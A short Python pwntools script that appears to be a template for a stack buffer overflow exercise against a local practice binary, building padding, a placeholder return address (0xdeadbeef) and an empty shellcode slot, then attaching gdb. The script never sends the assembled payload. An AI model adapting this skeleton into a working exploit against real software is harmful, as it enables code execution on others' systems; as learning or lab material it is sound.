#!/usr/bin/python3


from pwn import *


context.update(arch="i386",os="linux")

p = process("./fuzz_me.exe")


shellcode = b""

## Control EIP

buffer = b''
buffer += b'A'*100
buffer += p32(0xdeadbeef) #EIP 
buffer += b'B'*100


# Exploit (the magic happen here)

exploit = buffer
exploit += shellcode
exploit += b'B'*200 


gdb.attach(p,''' echo "hi" ''')

p.sendline("username")
#p.sendiline("…………")

p.interactive()
